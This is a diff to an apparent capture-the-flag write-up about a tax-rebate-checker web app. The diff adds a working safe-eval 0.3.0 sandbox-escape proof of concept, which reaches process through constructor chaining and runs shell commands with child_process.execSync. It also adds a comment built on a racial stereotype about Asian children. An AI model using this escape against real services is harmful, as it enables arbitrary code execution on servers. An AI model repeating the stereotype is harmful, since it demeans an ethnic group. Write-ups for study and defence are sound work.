@@ -52,7 +52,7 @@ Et voilá!
 We can see that the website sends a POST request to
 
 ```
-https://cors-anywhere.herokuapp.com/
+https://cors-anywhere.herokuapp.com/ (this part useless like Asian child who cannot get full marks.)
 
 https://af7jsq9nlh.execute-api.ap-southeast-1.amazonaws.com/prod/tax-rebate-checker (actual API endpoint)
 ```
@@ -97,6 +97,27 @@ As the application was running on Node.js, we can find the dependencies in `pack
 `safe-eval` is the only dependency listed, so we checked out its GitHub and NPM pages.
 
 Sure enough, `safe-eval 0.3.0` has a [critical vulnerability](https://github.com/hacksparrow/safe-eval/issues/5) to be exploited. (to add: explain what the person is doing. why does this bypass safe-eval?)
+
+```javascript
+const safeEval = require('safe-eval');
+
+const theFunction = function() {
+   const bad = new Error(); //Error() object
+   bad.__proto__ = null; // Sorry I am not a javascript programmer.
+   bad.stack = { //Error stacktrace
+      match(outer) { //outer i.e. theFunction()
+         throw outer.constructor.constructor("return process")().mainModule.require('child_process').execSync('whoami').toString();
+         //There are 2 constructors???
+         // I mean, at least the exploit is pretty clear in that you spawn a child process and execute arbitrary commands
+         
+      }
+   };
+   return bad;
+};
+
+const untrusted = `(${theFunction})()`;
+console.log(safeEval(untrusted));
+```
 
 ## Exploiting the Exploit
 
